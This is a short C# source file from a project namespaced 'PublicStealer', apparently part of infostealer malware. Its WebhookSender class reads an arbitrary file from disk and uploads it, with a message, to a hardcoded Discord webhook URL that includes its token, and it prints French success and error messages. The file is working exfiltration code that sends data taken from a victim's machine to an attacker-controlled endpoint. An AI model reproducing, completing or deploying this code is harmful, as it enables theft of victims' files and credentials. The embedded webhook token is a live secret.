using System;
using System.IO;
using System.Net.Http;
using System.Threading.Tasks;

namespace PublicStealer.Utils
{
    public static class WebhookSender
    {
        // CORRIGÉ : Suppression du guillemet parasite au début
        private static readonly string WebhookUrl = "https://discord.com/api/webhooks/1480700692221001898/tSl-QWBUPTlJ3ppJGld_20Hy8OGoO2oySxWk2C3sz8fs9Dlk94Z4d-vMcRJHWGg_K65j";

        public static async Task PostFile(string filePath, string message)
        {
            try
            {
                using (HttpClient client = new HttpClient())
                using (var content = new MultipartFormDataContent())
                {
                    byte[] fileBytes = File.ReadAllBytes(filePath);
                    var fileContent = new ByteArrayContent(fileBytes);
                    content.Add(fileContent, "file", Path.GetFileName(filePath));
                    content.Add(new StringContent(message), "content");

                    var res = await client.PostAsync(WebhookUrl, content);
                    if (res.IsSuccessStatusCode) Console.WriteLine("[+] Fichier envoyé avec succès !");
                }
            }
            catch (Exception ex) { Console.WriteLine("[-] Erreur Webhook : " + ex.Message); }
        }
    }
}